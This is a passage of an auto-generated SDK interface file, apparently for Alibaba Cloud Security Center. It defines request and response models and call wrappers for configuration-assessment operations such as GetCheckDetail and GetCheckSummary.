- **CDN**: Content Delivery Network 
- **CAS**: Digital Certificate Management Service (formerly SSL Certificates) 
- **RDC**: DevOps 
- **RAM**: Resource Access Management 
- **DDOS**: Distributed Denial of Service 
- **WAF**: Web Application Firewall 
- **OSS**: Object Storage Service 
- **POLARDB**: POLARDB 
- **POSTGRESQL**: PostgreSQL 
- **MSE**: MSE 
- **NAS**: Network Attached Storage 
- **SDDP**: Sensitive Data Discovery and Protection 
- **EIP**: Elastic IP', example='ECS'),
        regionId?: string(name='RegionId', description='Region ID.', example='cn-shanghai'),
        riskCount?: int32(name='RiskCount', description='Number of risks.', example='22'),
        vendor?: int32(name='Vendor', description='Cloud vendor. Values:  
- **ALIYUN**: Alibaba Cloud
- **TENCENT**: Tencent Cloud
- **MICROSOFT**: Azure
- **AWS**: Amazon Web Services (AWS)', example='ALIYUN'),
      }
    ](name='CheckCountStatisticItems', description='Risk item count statistics results.'),
    statisticType?: string(name='StatisticType', description='The type of data statistics. Values:  
- **user**: Top 5 over-authorized users.  
- **role**: Top 5 over-authorized roles.  
- **instance**: Top 5 risky cloud products.', example='instance'),
  }(name='CheckCountStatisticDTO', description='List of risk item count statistics results.'),
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for this request and can be used to troubleshoot and locate issues.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model GetCheckCountStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckCountStatisticResponseBody(name='body'),
}

/**
 * @summary Get the statistics of risk item counts
 *
 * @param request GetCheckCountStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckCountStatisticResponse
 */
async function getCheckCountStatisticWithOptions(request: GetCheckCountStatisticRequest, runtime: Util.RuntimeOptions): GetCheckCountStatisticResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.statisticType)) {
    query['StatisticType'] = request.statisticType;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckCountStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get the statistics of risk item counts
 *
 * @param request GetCheckCountStatisticRequest
 * @return GetCheckCountStatisticResponse
 */
async function getCheckCountStatistic(request: GetCheckCountStatisticRequest): GetCheckCountStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckCountStatisticWithOptions(request, runtime);
}

model GetCheckDetailRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of check items.

This parameter is required.', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='en'),
  regionId?: string(name='RegionId', description='The region ID of the instance.

>  You can call the [ListCloudAssetInstances](~~ListCloudAssetInstances~~) operation to query the region ID.', example='cn-hangzhou'),
}

model GetCheckDetailResponseBody = {
  assistInfo?: {
    link?: string(name='Link', description='The link to the help information about the risk item when the Type parameter is set to link.', example='https://www.alibabacloud.com/help/en/resource-access-management/latest/faq-about-ram-users'),
    type?: string(name='Type', description='The type of the help information about the risk item. Valid values:

*   **text**
*   **link**', example='text'),
    value?: string(name='Value', description='The content in the help information about the risk item when the Type parameter is set to text.', example='Configure an IP address whitelist'),
  }(name='AssistInfo', description='The help information about the check item.'),
  customConfigs?: [ 
    {
      defaultValue?: string(name='DefaultValue', description='The default value of the custom configuration item. The value is a string.', example='12'),
      name?: string(name='Name', description='The name of the custom configuration item, which is unique in a check item.', example='SessionTimeMax'),
      showName?: string(name='ShowName', description='The display name of the custom configuration item for internationalization.', example='Maximum session time'),
      typeDefine?: string(name='TypeDefine', description='The type of the custom configuration item. The value is a JSON string.', example='{\\\\"type\\\\":\\\\"NUMBER\\\\",\\\\"range\\\\":[1,24]}'),
      value?: string(name='Value', description='The value of the custom configuration item. The value is a string.', example='11'),
    }
  ](name='CustomConfigs', description='The custom configuration items of the check item.'),
  description?: {
    link?: string(name='Link', description='The link to the description of the check item.', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', description='The description type of the check item. The value is fixed as text.', example='text'),
    value?: string(name='Value', description='The content in the description of the check item.', example='The MSE instance does not enable authentication by default. If public network access is enabled at the same time, the data in the configuration center may be dragged and there is a security risk.'),
  }(name='Description', description='The description of the check item.'),
  repairReset?: string(name='RepairReset', description='>  This parameter is deprecated.', example='true', deprecated=true),
  repairSetting?: {
    flowStep?: [ 
      {
        showText?: string(name='ShowText', description='The text description of the fixing step.', example='The first step is to open the calling interface.'),
        step?: string(name='Step', description='The sequence number of the fixing step.', example='1'),
      }
    ](name='FlowStep', description='The description of the fixing workflow.'),
    repairConfigs?: [ 
      {
        consoleParamType?: string(name='ConsoleParamType', description='Indicates whether the value of the parameter is displayed in the console. Valid values:

*   0: The historical value and real-time value of the parameter are displayed.
*   1: Only the real-time value of the parameter is displayed.
*   2: The value of the parameter is not displayed in the console.', example='0'),
        customFlag?: boolean(name='CustomFlag', description='Indicates whether custom configurations of the fixing parameters are supported. Valid values:

*   **true**
*   **false**', example='true'),
        dataTransformType?: string(name='DataTransformType', description='Indicates whether data needs to be encrypted during transmission. Valid values:

*   0: Data does not need to be encrypted during transmission.
*   1: Data needs to be encrypted during transmission.
*   2: Data needs to be encrypted during transmission, and the user must perform secondary confirmation.', example='1'),
        defaultValue?: string(name='DefaultValue', description='The default value of the parameter. The value is a string.', example='1'),
        emptyParamSwitch?: string(name='EmptyParamSwitch', description='Indicates whether this parameter is specified by the user. Valid values:

*   0: The default value is used.
*   1: This parameter is required, and no default value is specified.
*   2: This parameter can be left empty.', example='1'),
        exclusiveName?: [ string ](name='ExclusiveName', description='The fixing parameters that are not compatible with this parameter.'),
        flowId?: string(name='FlowId', description='The ID of the fixing workflow.', example='64312d3ee19d470a9b54393dab****'),
        name?: string(name='Name', description='The name of the parameter. The name must be unique within the check item.', example='navicat'),
        showName?: string(name='ShowName', description='The display name of the parameter.', example='port'),
        typeDefine?: string(name='TypeDefine', description='The type of the parameter. The value is a JSON string.', example='{\\\\"type\\\\":\\\\"NUMBER\\\\",\\\\"range\\\\":[1,24]}'),
        usageType?: string(name='UsageType', description='The type of the parameter. Valid values:

*   1: asset parameters that are required during fixing.
*   2: user-provided parameters that are required during fixing.
*   3: parameters that are temporarily provided by the user.', example='1'),
        value?: string(name='Value', description='The user-configured value of the parameter. The value is a string.', example='2'),
      }
    ](name='RepairConfigs', description='The configurations of the fixing parameters.'),
    repairReset?: boolean(name='RepairReset', description='Indicates whether a restart is required after the fixing. Valid values:

*   **true**
*   **false**', example='true'),
    repairSupport?: boolean(name='RepairSupport', description='Indicates whether the check item supports the quick fix feature. Valid values:

*   **true**
*   **false**', example='true'),
    repairSupportType?: int32(name='RepairSupportType', description='The fixing type that is supported. Valid values:

*   **1**: The fixing and rollback are supported.
*   **2**: The fixing is supported, but the rollback is not supported.
*   **3**: The fixing must be performed on a third-party platform.', example='1'),
  }(name='RepairSetting', description='The fixing parameter configurations of the check item.'),
  repairSupportType?: int32(name='RepairSupportType', description='>  This parameter is deprecated.', example='1', deprecated=true),
  requestId?: string(name='RequestId', description='The request ID.', example='15A6ED6A-DBFE-5255-A248-289907809BEC'),
  solution?: {
    link?: string(name='Link', description='The link to the solution to handle the risk item when the Type parameter is set to link.', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', description='The type of the solution to handle the risk item. Valid values:

*   **text**
*   **link**', example='text'),
    value?: string(name='Value', description='The content of the solution to handle the risk item when the Type parameter is set to text.', example='Enter the MSE product console - registration and configuration center - instance list, click the corresponding instance name to enter the instance details, find the public network whitelist setting option in the basic information, and configure the whitelist according to business needs. It is forbidden to configure 0.0.0.0 or the whitelist as null.'),
  }(name='Solution', description='The solution to handle the risk item.'),
}

model GetCheckDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details about a check item that is used for configuration assessment.
 *
 * @param request GetCheckDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckDetailResponse
 */
async function getCheckDetailWithOptions(request: GetCheckDetailRequest, runtime: Util.RuntimeOptions): GetCheckDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about a check item that is used for configuration assessment.
 *
 * @param request GetCheckDetailRequest
 * @return GetCheckDetailResponse
 */
async function getCheckDetail(request: GetCheckDetailRequest): GetCheckDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckDetailWithOptions(request, runtime);
}

model GetCheckProcessRequest {
  taskId?: string(name='TaskId', description='The ID of the task.

> You can call the [SubmitCheck](~~SubmitCheck~~) operation to query the ID.', example='5347c7b6-c85c-4070-846a-3029e08e****'),
}

model GetCheckProcessResponseBody = {
  finishCount?: int32(name='FinishCount', description='The total number of assets on which the task is complete.', example='80'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D18B5DAD-BA97-5552-AE48-83F59D5F****'),
  statusCode?: string(name='StatusCode', description='The status code of the Cloud Security Posture Management (CSPM) task. Valid values:

*   0: The task is being initialized. The system is calculating the total number of subtasks.
*   1: The task is being executed. You can query the total number of tasks and the number of completed tasks.
*   2: The task is successful.
*   3: The task times out.
*   4: The task is invalid. Check whether assets exist.
*   5: No task record is found. Check whether the TaskId parameter is valid.', example='1'),
  taskId?: string(name='TaskId', description='The ID of the task.', example='5347c7b6-c85c-4070-846a-3029e08e****'),
  totalCount?: int32(name='TotalCount', description='The total number of assets on which the task is performed.', example='113'),
}

model GetCheckProcessResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckProcessResponseBody(name='body'),
}

/**
 * @summary Queries the progress of a configuration check task on cloud services.
 *
 * @param request GetCheckProcessRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckProcessResponse
 */
async function getCheckProcessWithOptions(request: GetCheckProcessRequest, runtime: Util.RuntimeOptions): GetCheckProcessResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckProcess',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of a configuration check task on cloud services.
 *
 * @param request GetCheckProcessRequest
 * @return GetCheckProcessResponse
 */
async function getCheckProcess(request: GetCheckProcessRequest): GetCheckProcessResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckProcessWithOptions(request, runtime);
}

model GetCheckRiskStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
}

model GetCheckRiskStatisticsResponseBody = {
  count?: int32(name='Count', description='The number of risk scenarios.', example='3'),
  data?: [ 
    {
      highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='43'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='29'),
      passCount?: int32(name='PassCount', description='The number of passed check items.', example='143'),
      sceneName?: string(name='SceneName', description='The name of the risk scenario.', example='SECURITY'),
      subStatistics?: [ 
        {
          alias?: string(name='Alias', description='The name of the baseline type.', example='weak_password'),
          highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='3'),
          lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='0'),
          mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='0'),
          passCount?: int32(name='PassCount', description='The number of passed check items.', example='2'),
          totalCount?: int32(name='TotalCount', description='The total number of check items.', example='5'),
          typeName?: string(name='TypeName', description='The baseline type.', example='weak_password'),
        }
      ](name='SubStatistics', description='The statistics on check items that are used in the risk scenario by baseline type.'),
      totalCount?: int32(name='TotalCount', description='The total number of check items.', example='219'),
    }
  ](name='Data', description='An array consisting of the statistics on check items that are used in risk scenarios.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C455672-2490-5211-84EC-420C7818****'),
  summary?: {
    handledCheckToday?: int32(name='HandledCheckToday', description='Check items handled today.', example='0'),
    handledCheckTotal?: int32(name='HandledCheckTotal', description='A risk item exists.', example='3'),
    handledDays?: int32(name='HandledDays', description='Total days since check items were handled.', example='365'),
    riskCheckCnt?: int32(name='RiskCheckCnt', description='Check items that failed to pass the check.', example='1'),
    riskDays?: int32(name='RiskDays', description='Days since check items failed.', example='30'),
    riskWarningCnt?: int32(name='RiskWarningCnt', description='Risks to be handled.', example='5'),
  }(name='Summary', description='Historical check item statistics.'),
}

model GetCheckRiskStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckRiskStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on risk scenarios and check items that are used in the risk scenarios, including the statistics on low-risk, medium-risk, and high-risk items by baseline type.
 *
 * @param request GetCheckRiskStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckRiskStatisticsResponse
 */
async function getCheckRiskStatisticsWithOptions(request: GetCheckRiskStatisticsRequest, runtime: Util.RuntimeOptions): GetCheckRiskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckRiskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on risk scenarios and check items that are used in the risk scenarios, including the statistics on low-risk, medium-risk, and high-risk items by baseline type.
 *
 * @param request GetCheckRiskStatisticsRequest
 * @return GetCheckRiskStatisticsResponse
 */
async function getCheckRiskStatistics(request: GetCheckRiskStatisticsRequest): GetCheckRiskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckRiskStatisticsWithOptions(request, runtime);
}

model GetCheckSaleRequest {
  regionId?: string(name='RegionId', description='The region in which the Security Center instance is deployed. Valid values:

*   **cn-hangzhou:** inside China
*   Global **ap-southeast-1:** outside China', example='cn-hangzhou'),
}

model GetCheckSaleResponseBody = {
  checkSale?: {
    consumeCount?: long(name='ConsumeCount', description='The consumed quota.', example='500'),
    loyalUser?: boolean(name='LoyalUser', description='Indicates whether the user is an existing user and whether the user uses the configuration assessment feature before the feature is released for sale on July 07, 2023. Valid values:

*   **true**: existing user
*   **false**: new user', example='true'),
    purchaseCount?: long(name='PurchaseCount', description='The purchased quota.', example='1000'),
    saleUserType?: int32(name='SaleUserType', description='The type of the user. Valid values:

*   **1**: a user who can use all check items.
*   **2**: an user who can only use the check items before the release of the feature on July 07, 2023. This type of users must upgrade Security Center before the users can use all check items.
*   **3**: a new user who cannot use the configuration assessment feature. This type of users must make a purchase before the users can use the feature.', example='1'),
  }(name='CheckSale', description='The sales information about the configuration assessment quota.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model GetCheckSaleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckSaleResponseBody(name='body'),
}

/**
 * @summary Queries the sales information about the configuration assessment feature, including the purchased quota and the consumed quota.
 *
 * @param request GetCheckSaleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckSaleResponse
 */
async function getCheckSaleWithOptions(request: GetCheckSaleRequest, runtime: Util.RuntimeOptions): GetCheckSaleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckSale',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the sales information about the configuration assessment feature, including the purchased quota and the consumed quota.
 *
 * @param request GetCheckSaleRequest
 * @return GetCheckSaleResponse
 */
async function getCheckSale(request: GetCheckSaleRequest): GetCheckSaleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckSaleWithOptions(request, runtime);
}

model GetCheckStructureRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  regionId?: string(name='RegionId', description='The region ID of the asset. Valid values:

*   cn-hangzhou: China.
*   ap-southeast-1: outside China.', example='cn-hangzhou'),
}

model GetCheckStructureResponseBody = {
  checkStructureResponse?: [ 
    {
      standardType?: string(name='StandardType', description='The type of the check item.

*   RISK: security risk.
*   IDENTITY_PERMISSION: Cloud Infrastructure Entitlement Management (CIEM).
*   COMPLIANCE: security compliance.', example='RISK'),
      standards?: [ 
        {
          id?: long(name='Id', description='The standard ID of the check item.', example='8'),
          requirements?: [ 
            {
              id?: long(name='Id', description='The ID of the requirement item for the check item.', example='46'),
              sections?: [ 
                {
                  id?: long(name='Id', description='The ID of the section for the check item.', example='177'),
                  showName?: string(name='ShowName', description='The display name of the section for the check item.', example='Access Control'),
                }
              ](name='Sections', description='The information about the sections of check items.'),
              showName?: string(name='ShowName', description='The display name of the requirement item for the check item.', example='Networking'),
              totalCheckCount?: int32(name='TotalCheckCount', description='The total number of check items for the requirement.', example='36'),
            }
          ](name='Requirements', description='The standards of the check items.'),
          showName?: string(name='ShowName', description='The display name of the standard for the check item.', example='Alibaba Cloud best security practices'),
          type?: string(name='Type', description='The standard type of the check item. Valid values:

*   RISK: security risk.
*   IDENTITY_PERMISSION: CIEM.
*   COMPLIANCE: security compliance.', example='IDENTITY_PERMISSION'),
        }
      ](name='Standards', description='The structure information about the check items of the business type.'),
    }
  ](name='CheckStructureResponse', description='The structure information about check items provided by the configuration assessment feature.'),
  requestId?: string(name='RequestId', description='The request ID.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
}

model GetCheckStructureResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckStructureResponseBody(name='body'),
}

/**
 * @summary Obtains the structure information about check items provided by the configuration assessment feature.
 *
 * @description You must purchase the configuration assessment feature before you can use the feature.
 *
 * @param request GetCheckStructureRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckStructureResponse
 */
async function getCheckStructureWithOptions(request: GetCheckStructureRequest, runtime: Util.RuntimeOptions): GetCheckStructureResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckStructure',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the structure information about check items provided by the configuration assessment feature.
 *
 * @description You must purchase the configuration assessment feature before you can use the feature.
 *
 * @param request GetCheckStructureRequest
 * @return GetCheckStructureResponse
 */
async function getCheckStructure(request: GetCheckStructureRequest): GetCheckStructureResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckStructureWithOptions(request, runtime);
}

model GetCheckSummaryRequest {
  isItemStatistic?: boolean(name='IsItemStatistic', description='Specifies whether to return the statistics of the check items, including the number of check items supported by the system and the number of check items available to you. Default value: **false**. Valid values:

*   **true**
*   **false**', example='false'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the IDs of Alibaba Cloud accounts.', example='000'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers.'),
}

model GetCheckSummaryResponseBody = {
  overallItemStatistic?: {
    releaseCount?: int32(name='ReleaseCount', description='The number of check items supported by the system.', example='620'),
    resultCount?: int32(name='ResultCount', description='The number of check items available to you.', example='25'),
  }(name='OverallItemStatistic', description='The statistics about the number of check items.'),
  overallStatistic?: {
    notCheckCount?: int32(name='NotCheckCount', description='The number of unchecked check items.', example='3'),
    notCheckHighCount?: int32(name='NotCheckHighCount', description='The number of unchecked high-risk check items.', example='1'),
    notCheckLowCount?: int32(name='NotCheckLowCount', description='The number of unchecked low-risk check items.', example='1'),
    notCheckMediumCount?: int32(name='NotCheckMediumCount', description='The number of unchecked medium-risk check items.', example='1'),
    notPassCount?: int32(name='NotPassCount', description='The number of check items that failed to pass the check.', example='3'),
    notPassHighCount?: int32(name='NotPassHighCount', description='The number of high-risk check items that failed to pass the check.', example='1'),
    notPassLowCount?: int32(name='NotPassLowCount', description='The number of low-risk check items that failed to pass the check.', example='1'),
    notPassMediumCount?: int32(name='NotPassMediumCount', description='The number of medium-risk check items that failed to pass the check.', example='1'),
    passCount?: int32(name='PassCount', description='The number of check items that pass the check.', example='3'),
    passHighCount?: int32(name='PassHighCount', description='The number of high-risk check items that pass the check.', example='1'),
    passLowCount?: int32(name='PassLowCount', description='The number of low-risk check items that pass the check.', example='1'),
    passMediumCount?: int32(name='PassMediumCount', description='The number of medium-risk check items that pass the check.', example='1'),
  }(name='OverallStatistic', description='The overall risk statistics.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='843E4805-****-7EE12FA8DBFD'),
  summarys?: [ 
    {
      failCount?: int32(name='FailCount', description='The number of detected risk items.', example='5'),
      passCount?: long(name='PassCount', description='The number of check items that pass the check.', example='10'),
      standards?: [ 
        {
          failCount?: int32(name='FailCount', description='The number of check items that failed to pass the check.', example='1'),
          id?: long(name='Id', description='The ID of the check item.', example='1'),
          passCount?: int32(name='PassCount', description='The number of check items that pass the check.', example='1'),
          riskLevelHighCount?: int32(name='RiskLevelHighCount', description='The number of **high-risk** items.', example='1'),
          riskLevelLowCount?: int32(name='RiskLevelLowCount', description='The number of **low-risk** items.', example='1'),
          riskLevelMediumCount?: int32(name='RiskLevelMediumCount', description='The number of **medium-risk** items.', example='1'),
          showName?: string(name='ShowName', description='The name of the check item.', example='Identity and permission management'),
          standardStatistic?: {
            notCheckCount?: int32(name='NotCheckCount', description='The number of unchecked check items.', example='3'),
            notCheckHighCount?: int32(name='NotCheckHighCount', description='The number of unchecked high-risk check items.', example='1'),
            notCheckLowCount?: int32(name='NotCheckLowCount', description='The number of unchecked low-risk check items.', example='1'),
            notCheckMediumCount?: int32(name='NotCheckMediumCount', description='The number of unchecked medium-risk check items.', example='1'),
            notPassCount?: int32(name='NotPassCount', description='The number of check items that failed to pass the check.', example='3'),
            notPassHighCount?: int32(name='NotPassHighCount', description='The number of high-risk check items that failed to pass the check.', example='1'),
            notPassLowCount?: int32(name='NotPassLowCount', description='The number of low-risk check items that failed to pass the check.', example='1'),
            notPassMediumCount?: int32(name='NotPassMediumCount', description='The number of medium-risk check items that failed to pass the check.', example='1'),
            passCount?: int32(name='PassCount', description='The number of check items that pass the check.', example='3'),
            passHighCount?: int32(name='PassHighCount', description='The number of high-risk check items that pass the check.', example='1'),
            passLowCount?: int32(name='PassLowCount', description='The number of low-risk check items that pass the check.', example='1'),
            passMediumCount?: int32(name='PassMediumCount', description='The number of medium-risk check items that pass the check.', example='1'),
          }(name='StandardStatistic', description='The standard statistics of the check items.'),
        }
      ](name='Standards', description='The information about the check items.'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   **COMPLIANCE**
*   **RISK**
*   **IDENTITY_PERMISSION**', example='IDENTITY_PERMISSION'),
      typeStatistic?: {
        notCheckCount?: int32(name='NotCheckCount', description='The number of unchecked check items.', example='3'),
        notCheckHighCount?: int32(name='NotCheckHighCount', description='The number of unchecked high-risk check items.', example='1'),
        notCheckLowCount?: int32(name='NotCheckLowCount', description='The number of unchecked low-risk check items.', example='1'),
        notCheckMediumCount?: int32(name='NotCheckMediumCount', description='The number of unchecked medium-risk check items.', example='1'),
        notPassCount?: int32(name='NotPassCount', description='The number of check items that failed to pass the check.', example='3'),
        notPassHighCount?: int32(name='NotPassHighCount', description='The number of high-risk check items that failed to pass the check.', example='1'),
        notPassLowCount?: int32(name='NotPassLowCount', description='The number of low-risk check items that failed to pass the check.', example='1'),
        notPassMediumCount?: int32(name='NotPassMediumCount', description='The number of medium-risk check items that failed to pass the check.', example='1'),
        passCount?: int32(name='PassCount', description='The number of check items that pass the check.', example='3'),
        passHighCount?: int32(name='PassHighCount', description='The number of high-risk check items that pass the check.', example='1'),
        passLowCount?: int32(name='PassLowCount', description='The number of low-risk check items that pass the check.', example='1'),
        passMediumCount?: int32(name='PassMediumCount', description='The number of medium-risk check items that pass the check.', example='1'),
      }(name='TypeStatistic', description='The risk statistics by type.'),
    }
  ](name='Summarys', description='The summary information about the configuration checks on cloud services.'),
}

model GetCheckSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the summary information about the configuration checks on cloud services.
 *
 * @param request GetCheckSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckSummaryResponse
 */
async function getCheckSummaryWithOptions(request: GetCheckSummaryRequest, runtime: Util.RuntimeOptions): GetCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.isItemStatistic)) {
    query['IsItemStatistic'] = request.isItemStatistic;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
